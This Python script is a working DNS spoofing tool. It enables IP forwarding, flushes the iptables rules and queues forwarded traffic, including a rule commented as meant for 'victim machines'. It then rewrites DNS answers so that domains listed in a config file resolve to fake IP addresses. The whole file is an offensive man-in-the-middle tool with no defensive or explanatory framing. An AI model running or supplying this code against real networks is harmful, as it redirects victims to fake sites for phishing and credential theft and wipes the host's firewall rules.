#!/usr/bin/env python

import subprocess

import netfilterqueue
import scapy.all as scapy
import yaml


def init_setup(queue_num):
    # Enable IP forwarding
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        subprocess.call(["echo", "1"], stdout=f)
    print("[+] \033[1mEnabled IP forwarding \033[0m\n")
    # Flushing to clear existing iptables
    subprocess.call(["iptables", "--flush"])
    # For Test in local machine
    # Comment if unnecessary
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", str(queue_num)])
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", str(queue_num)])

    # For separate victim machines
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(queue_num)])
    print("[+] \033[1mModified IP tables \033[0m\n")

def process_packets(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname

        try:
            with open("../config/config.yaml") as f:
                fake_ip_dict = yaml.safe_load(f)
        # except FileNotFoundError:  # Python3 code
        except IOError:
            print("[-] \033[91mCannot Read Configurations file.... Exiting\033[0m")
            exit()

        fake_ip = [fake_ip_dict[site] for site in fake_ip_dict.keys() if site in qname]

        if fake_ip:
            print("[/] \033[96m \'"+ qname +"\' is spoofed with fake website...\033[0m")
            fake_dns_response = scapy.DNSRR(rrname=qname, rdata=fake_ip[0])

            ## Modifying the DNS response field in the response packet
            scapy_packet[scapy.DNS].an = fake_dns_response
            scapy_packet[scapy.DNS].ancount = 1

            ## Remove checksum and length fields
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            ## Update netfilterqueue packet with the scapy packet
            packet.set_payload(str(scapy_packet))

    packet.accept()


if __name__ == "__main__":

    queue_num = 0
    init_setup(queue_num)
    print("[+] \033[92mDNS Spoofing Starting...\033[0m\n-----------------------------")
    try:
        pack_queue = netfilterqueue.NetfilterQueue()
        pack_queue.bind(int(queue_num), process_packets)
        pack_queue.run()
    except KeyboardInterrupt:
        print("-----------------------------------------------")
        print("[/] \033[1mDetected Keyboard Interrupt.......\033[0m")
        print("[/] \033[1mFlushing the IP Tables\033[0m")
        subprocess.call(["iptables", "--flush"])
        print("[+] \033[92mExiting\033[0m")